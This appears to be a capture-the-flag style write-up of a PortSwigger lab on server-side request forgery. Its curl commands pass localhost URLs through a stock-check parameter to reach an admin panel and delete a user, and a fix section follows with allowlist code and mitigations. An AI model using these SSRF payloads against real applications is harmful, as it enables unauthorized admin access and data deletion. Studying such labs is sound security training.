---
layout: post
title: "Basic SSRF Against the Local Server"
date: 2027-08-21 09:00:00 -0500
categories: [PortSwigger, SSRF]
tags: [ssrf, cwe-918, localhost, access-control-bypass, server-side-request-forgery]
---

## Overview

A "Check stock" feature sends a `stockApi` parameter containing a full URL, which the application fetches server-side with no host or protocol restriction. That makes it a [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html) primitive: supply a `localhost` URL and the server's own request inherits the trust the admin panel reserves for loopback traffic.

The goal is to reach `/admin` (blocked externally) and delete the user `carlos` — two requests, no scanning required.

This is the simpler sibling of "Basic SSRF against another back-end system" — the admin interface lives on the same host, so there is no IP range to scan.

---

## The Vulnerability

**[CWE-918](https://cwe.mitre.org/data/definitions/918.html) — Server-Side Request Forgery**

The stock-check form POSTs a `stockApi` field whose value is a complete URL:

```
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3F...
```

The server fetches that URL and returns the response body directly to the client. The application enforces no allowlist, no private-range block, and no scheme restriction — the attacker controls the entire outbound request.

The `/admin` panel has a separate access control that rejects requests from external IPs. It does not, however, require authentication — it simply checks `REMOTE_ADDR`. A request arriving from `127.0.0.1` passes unconditionally, because the panel assumes only the server itself can reach loopback.

---

## Exploit

### 1. Confirm the SSRF primitive

```bash
BASE='https://<lab-id>.web-security-academy.net'
curl -sk -X POST $BASE/product/stock -d 'stockApi=http%3A%2F%2Flocalhost%2F' -o /dev/null -w "%{http_code}\n"
# -> 200   (the server-side fetch hit its own root)
```

### 2. Fetch the admin panel via `localhost`

```bash
curl -s -X POST $BASE/product/stock \
  -d 'stockApi=http%3A%2F%2Flocalhost%2Fadmin' \
  | grep -oP 'href="(/admin/[^"]+)"'
# -> href="/admin/delete?username=wiener"
# -> href="/admin/delete?username=carlos"
```

The response is the full admin panel HTML, including delete links for both users. The `/admin` endpoint is bypassed because the fetch originates from `127.0.0.1`.

### 3. Execute the delete action

```bash
curl -s -X POST $BASE/product/stock \
  -d 'stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos'
# -> [HTTP 302]   carlos deleted; lab solved
```

The 302 confirms the action executed. The `is-solved` status widget flips on the first poll (synchronous solve — no lag).

---

## Why It Worked

The admin panel's access control checked only the network origin of the incoming HTTP request. Because the stock-check service fetches the URL server-side, the request to `/admin` arrives from `127.0.0.1` — the check passes as if the server's own process had navigated there.

This is the [server-side request forgery](https://cwe.mitre.org/data/definitions/918.html) primitive in its purest form: the attacker redirects the server's trusted outbound identity toward a target the attacker cannot reach directly. No exploit tooling, no bypass chains — just a URL the app will helpfully fetch on your behalf.

---

## The Fix

```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_HOSTS = {"stock.internal.example.com"}

def fetch_stock(stockapi_url: str) -> str:
    parsed = urlparse(stockapi_url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Forbidden URL")
    return requests.get(stockapi_url, timeout=5, allow_redirects=False).text
```

- **Don't accept full URLs from clients for server-side fetches.** Accept an opaque store id and build the URL from a server-side map.
- **If a URL must be accepted, enforce an allowlist** on the scheme, hostname, and port — checked *after* DNS resolution, re-validated on every redirect hop.
- **Block loopback, RFC1918, and link-local ranges** (including alternate representations: decimal `2130706433`, octal `0177.0.0.1`, `[::1]`).
- **Require real authentication on admin endpoints**, not network-origin trust alone. An IP check is bypassable by any SSRF on the same host.
- **Disable or validate redirect-following** — an `http://trusted-host/` that returns a `301` to `http://localhost/admin` defeats hostname-only validation.
